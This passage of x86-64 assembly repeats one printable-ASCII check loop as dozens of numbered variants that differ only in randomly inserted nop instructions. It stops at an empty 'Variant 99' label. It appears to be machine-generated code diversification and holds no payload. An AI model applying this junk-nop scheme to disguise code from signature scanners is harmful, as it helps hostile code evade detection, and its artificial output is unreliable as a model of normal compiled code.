	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 25
.Lmain_win2_var25:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 26
.Lmain_win2_var26:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 27
.Lmain_win2_var27:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 28
.Lmain_win2_var28:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 29
.Lmain_win2_var29:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 30
.Lmain_win2_var30:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 31
.Lmain_win2_var31:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 32
.Lmain_win2_var32:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 33
.Lmain_win2_var33:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 34
.Lmain_win2_var34:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 35
.Lmain_win2_var35:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 36
.Lmain_win2_var36:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 37
.Lmain_win2_var37:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 38
.Lmain_win2_var38:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 39
.Lmain_win2_var39:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 40
.Lmain_win2_var40:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 41
.Lmain_win2_var41:
	popq	%rax
	nop
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 42
.Lmain_win2_var42:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 43
.Lmain_win2_var43:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 44
.Lmain_win2_var44:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 45
.Lmain_win2_var45:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 46
.Lmain_win2_var46:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 47
.Lmain_win2_var47:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 48
.Lmain_win2_var48:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 49
.Lmain_win2_var49:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 50
.Lmain_win2_var50:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 51
.Lmain_win2_var51:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 52
.Lmain_win2_var52:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 53
.Lmain_win2_var53:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 54
.Lmain_win2_var54:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 55
.Lmain_win2_var55:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 56
.Lmain_win2_var56:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 57
.Lmain_win2_var57:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 58
.Lmain_win2_var58:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 59
.Lmain_win2_var59:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 60
.Lmain_win2_var60:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 61
.Lmain_win2_var61:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 62
.Lmain_win2_var62:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 63
.Lmain_win2_var63:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 64
.Lmain_win2_var64:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 65
.Lmain_win2_var65:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 66
.Lmain_win2_var66:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 67
.Lmain_win2_var67:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 68
.Lmain_win2_var68:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 69
.Lmain_win2_var69:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 70
.Lmain_win2_var70:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 71
.Lmain_win2_var71:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 72
.Lmain_win2_var72:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 73
.Lmain_win2_var73:
	popq	%rax
	nop
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 74
.Lmain_win2_var74:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 75
.Lmain_win2_var75:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 76
.Lmain_win2_var76:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 77
.Lmain_win2_var77:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 78
.Lmain_win2_var78:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 79
.Lmain_win2_var79:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 80
.Lmain_win2_var80:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 81
.Lmain_win2_var81:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 82
.Lmain_win2_var82:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 83
.Lmain_win2_var83:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
	nop
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 84
.Lmain_win2_var84:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 85
.Lmain_win2_var85:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 86
.Lmain_win2_var86:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 87
.Lmain_win2_var87:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 88
.Lmain_win2_var88:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 89
.Lmain_win2_var89:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 90
.Lmain_win2_var90:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 91
.Lmain_win2_var91:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 92
.Lmain_win2_var92:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 93
.Lmain_win2_var93:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 94
.Lmain_win2_var94:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 95
.Lmain_win2_var95:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 96
.Lmain_win2_var96:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 97
.Lmain_win2_var97:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 98
.Lmain_win2_var98:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 99
.Lmain_win2_var99:
